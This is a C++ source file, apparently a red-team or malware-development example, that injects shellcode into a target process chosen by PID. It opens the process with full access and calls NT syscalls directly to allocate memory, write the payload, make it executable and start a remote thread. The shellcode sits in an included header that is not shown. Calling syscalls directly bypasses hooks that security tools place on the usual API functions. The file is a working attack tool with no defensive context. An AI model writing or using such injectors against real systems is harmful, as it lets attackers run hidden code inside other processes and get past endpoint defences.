#include <iostream>
#include "shellcode.h"
#include "syscalls.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

int main(int argc, char* argv[])
{
    printf("**** Syscalls Example! ****\n");

    if (argc != 2) {
        printf("[!] Usage: %s <pid to inject into>\n", argv[0]);
        return EXIT_FAILURE;
    }

    auto pid = atoi(argv[1]);

    if (!pid) {
        printf("[-] Invalid PID: %s\n", argv[1]);
        return EXIT_FAILURE;
    }

    HANDLE hProcess;
    CLIENT_ID clientId{};
    clientId.UniqueProcess = (HANDLE)pid;
    OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
    auto status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to open process: %d, NTSTATUS: 0x%x\n", pid, status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully opened process %d\n", pid);



    size_t shellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);
    printf("[*] Shellcode length: %lld\n", shellcodeSize);
    PVOID baseAddress = NULL;
    size_t allocSize = shellcodeSize;
    status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to allocate memory, NTSTATUS: 0x%x\n", status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully allocated RW memory at 0x%p of size %lld\n", baseAddress, allocSize);


    
    size_t bytesWritten;
    status = NtWriteVirtualMemory(hProcess, baseAddress, &shellcode, shellcodeSize, &bytesWritten);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to write shellcode to memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully wrote shellcode to memory\n");



    DWORD oldProtect;
    status = NtProtectVirtualMemory(hProcess, &baseAddress, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to change permission to RX on memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully changed memory protections to RX\n");



    HANDLE hThread;
    CONTEXT threadContext;
    CLIENT_ID threadClientId;
    USER_STACK teb;
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddress, NULL, FALSE, NULL, NULL, NULL, NULL); 
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create thread, NTSTATUS: 0x%x\n", status);
        return EXIT_FAILURE;
    }
    printf("[*] Successfully created thread in process\n");



    printf("[+] Shellcode injected using syscalls!\n");
    return EXIT_SUCCESS;
}
